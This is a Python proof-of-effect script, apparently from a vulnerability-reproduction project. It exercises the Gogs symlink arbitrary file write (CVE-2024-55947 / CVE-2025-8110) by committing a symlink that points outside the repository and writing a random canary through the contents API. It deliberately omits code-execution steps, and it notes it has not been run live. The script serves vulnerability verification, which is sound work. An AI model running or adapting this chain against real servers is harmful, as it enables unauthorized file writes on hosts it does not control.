#!/usr/bin/env python3
# =============================================================================
# EFFECT-ONLY proof-of-effect driver (RFC 0003 / RFC 0001 invariant 8).
#
# This driver demonstrates the OBSERVABLE EFFECT of CVE-2024-55947 /
# CVE-2025-8110 on Gogs: an arbitrary file write to a sentinel path OUTSIDE
# the repository working tree, via a committed symlink + the Gogs contents API.
#
# It writes ONLY a benign, random per-trial canary token to a sentinel file. It
# does NOT, and MUST NOT, write an executable payload, a git hook, an
# authorized_keys entry, or anything that gains code execution. The weaponized
# RCE recipe is deliberately absent — the published artifact carries the EFFECT
# (the out-of-repo write), never the weaponization.
#
# The observable side-effect is: the per-trial canary bytes appear at the
# out-of-repo sentinel path (filesystem-write observability, RFC 0009). On the
# real-fix build (v0.13.4) the write is refused and the sentinel stays absent
# -> the negative-control trace is dark -> PoNE.
#
# AUTHORED, NOT LIVE-EXECUTED THIS PASS. The Gogs first-run/install flow and the
# exact contents-API auth handshake were written from the documented API surface
# and may need a tweak against a live server (see repo NOTES.md).
# =============================================================================
import argparse
import json
import os
import secrets
import subprocess
import sys
import tempfile
import time
import urllib.parse
import urllib.request
import urllib.error

# The DB-write sink reached by this path is UpdateRepoFile; the web ingress is the
# repo file-edit route (editFilePost). NOTE (low-confidence): it is not fully
# confirmed whether the demo should drive the web `_edit` route (editFilePost) or
# the v1 `contents` API handler below — the shared file-write sink is UpdateRepoFile
# either way. This driver uses the v1 contents API for a scriptable, deterministic
# observable; swap to the web route if the live trial shows the API path differs.

SENTINEL_DIR = "/srv/sentinel"            # out-of-repo target dir (created in the Dockerfiles)
SENTINEL_NAME = "poe.txt"                 # the out-of-repo file the canary lands in
SYMLINK_IN_REPO = "link"                  # the committed symlink path inside the repo


def _req(method, url, token=None, body=None, headers=None, basic=None):
    data = None
    hdrs = dict(headers or {})
    if body is not None:
        data = json.dumps(body).encode()
        hdrs["Content-Type"] = "application/json"
    if token:
        hdrs["Authorization"] = "token " + token
    if basic:
        import base64
        raw = ("%s:%s" % basic).encode()
        hdrs["Authorization"] = "Basic " + base64.b64encode(raw).decode()
    r = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(r) as resp:
            raw = resp.read()
            return resp.status, (json.loads(raw) if raw else None)
    except urllib.error.HTTPError as e:
        raw = e.read()
        try:
            return e.code, json.loads(raw) if raw else None
        except Exception:
            return e.code, raw.decode(errors="replace")


def wait_up(base, timeout=60):
    """Poll the Gogs HTTP endpoint until it answers (server boot can lag)."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with urllib.request.urlopen(base, timeout=3) as resp:
                if resp.status < 500:
                    return True
        except urllib.error.HTTPError:
            return True  # any HTTP response means the server is serving
        except Exception:
            time.sleep(1)
    return False


def install(base, admin_user, admin_pass, admin_email):
    """Drive the Gogs first-run /install form (idempotent: a 2nd POST is a no-op
    once configured). SQLite keeps the reproducer self-contained and offline."""
    form = {
        "db_type": "SQLite3",
        "db_path": "data/gogs.db",
        "app_name": "Gogs",
        "repo_root_path": "/home/git/gogs-repositories",
        "run_user": "git",
        "domain": "localhost",
        "ssh_port": "22",
        "http_port": "3000",
        "app_url": base + "/",
        "log_root_path": "/home/git/log",
        "admin_name": admin_user,
        "admin_passwd": admin_pass,
        "admin_confirm_passwd": admin_pass,
        "admin_email": admin_email,
    }
    data = urllib.parse.urlencode(form).encode()
    r = urllib.request.Request(base + "/install", data=data, method="POST")
    try:
        urllib.request.urlopen(r, timeout=30)
    except urllib.error.HTTPError as e:
        # A 3xx redirect after a successful install surfaces here; treat as OK.
        if e.code not in (302, 303, 200):
            print("install: HTTP %d (may already be installed)" % e.code)
    except Exception as ex:
        print("install: %s (may already be installed)" % ex)


def make_token(base, user, password):
    """Mint an API token via basic auth (the documented /api/v1 tokens surface)."""
    status, body = _req(
        "POST", "%s/api/v1/users/%s/tokens" % (base, user),
        basic=(user, password), body={"name": "poe-%s" % secrets.token_hex(4)},
    )
    if isinstance(body, dict) and body.get("sha1"):
        return body["sha1"]
    raise SystemExit("could not mint API token: HTTP %s %r" % (status, body))


def create_repo(base, token, repo):
    # auto_init needs an explicit readme template name; an empty one makes Gogs
    # 0.13.x resolve the options/readme *directory* and fail ("read readme: is a
    # directory"). "Default" seeds a master branch the contents-API write targets.
    _req("POST", base + "/api/v1/user/repos", token=token,
         body={"name": repo, "auto_init": True, "readme": "Default", "private": False})


def commit_symlink(base, user, password, repo, target):
    """Clone the repo over HTTP, add a symlink that points OUTSIDE the repo, and
    push it. This is plain git — committing a symlink is a normal, allowed
    operation; the vulnerability is that the server later *follows* it on write."""
    creds = "%s:%s" % (urllib.parse.quote(user), urllib.parse.quote(password))
    parsed = urllib.parse.urlparse(base)
    clone_url = "%s://%s@%s/%s/%s.git" % (parsed.scheme, creds, parsed.netloc, user, repo)
    with tempfile.TemporaryDirectory() as tmp:
        subprocess.run(["git", "clone", clone_url, tmp], check=True)
        link_path = os.path.join(tmp, SYMLINK_IN_REPO)
        # Symlink -> the out-of-repo sentinel directory. Writing to "<link>/<file>"
        # therefore resolves to "<sentinel-dir>/<file>", outside the repo tree.
        os.symlink(SENTINEL_DIR, link_path)
        env = dict(os.environ,
                   GIT_AUTHOR_NAME="poe", GIT_AUTHOR_EMAIL="poe@example.invalid",
                   GIT_COMMITTER_NAME="poe", GIT_COMMITTER_EMAIL="poe@example.invalid")
        subprocess.run(["git", "-C", tmp, "add", SYMLINK_IN_REPO], check=True, env=env)
        subprocess.run(["git", "-C", tmp, "commit", "-m", "add link"], check=True, env=env)
        subprocess.run(["git", "-C", tmp, "push", "origin", "HEAD"], check=True, env=env)


def write_through(base, token, user, repo, token_bytes):
    """Call the contents API to write a benign canary THROUGH the committed
    symlink. Path "<link>/<sentinel-name>" resolves outside the repo; on a
    vulnerable build the server follows it and writes to the sentinel."""
    import base64
    path = "%s/%s" % (SYMLINK_IN_REPO, SENTINEL_NAME)
    url = "%s/api/v1/repos/%s/%s/contents/%s" % (base, user, repo, path)
    body = {
        "message": "poe",
        "content": base64.b64encode(token_bytes).decode(),
        "branch": "master",
    }
    status, resp = _req("POST", url, token=token, body=body)
    return status, resp


def main():
    ap = argparse.ArgumentParser(description="Effect-only Gogs symlink-write PoE driver")
    ap.add_argument("--base", default="http://localhost:3000", help="Gogs base URL")
    ap.add_argument("--user", default="poeadmin")  # `admin` is a reserved name in Gogs 0.13.x
    ap.add_argument("--password", default="admin12345")
    ap.add_argument("--email", default="admin@example.invalid")
    ap.add_argument("--repo", default="poe")
    ap.add_argument("--sentinel", default=os.path.join(SENTINEL_DIR, SENTINEL_NAME),
                    help="out-of-repo sentinel path the canary must NOT reach on a fixed build")
    args = ap.parse_args()

    # Per-trial canary: a fresh random token so the observer can match THIS trial's
    # write and never a stale artifact from a previous run.
    canary = ("tegron-poe-%s" % secrets.token_hex(16)).encode()

    if not wait_up(args.base):
        raise SystemExit("gogs did not come up at %s" % args.base)

    install(args.base, args.user, args.password, args.email)
    token = make_token(args.base, args.user, args.password)
    create_repo(args.base, token, args.repo)
    commit_symlink(args.base, args.user, args.password, args.repo, args.sentinel)
    status, resp = write_through(args.base, token, args.user, args.repo, canary)
    print("contents API write: HTTP %s" % status)

    # The verdict is decided by the EFFECT, not by the API status code: did the
    # canary land at the out-of-repo sentinel? If so, the write escaped the repo
    # (PoE). On a fixed build (v0.13.4) the symlink is rejected and the sentinel
    # stays absent -> dark negative-control trace -> PoNE.
    try:
        with open(args.sentinel, "rb") as f:
            landed = f.read()
    except FileNotFoundError:
        landed = b""

    fired = canary in landed
    record = {
        "observable": "out_of_repo_file_write",
        "sentinel": args.sentinel,
        "canary": canary.decode(),
        "fired": fired,
        "api_status": status,
    }
    print(json.dumps(record))
    # Exit 0 = effect observed (PoE positive control fired); exit 3 = dark (PoNE).
    sys.exit(0 if fired else 3)


if __name__ == "__main__":
    main()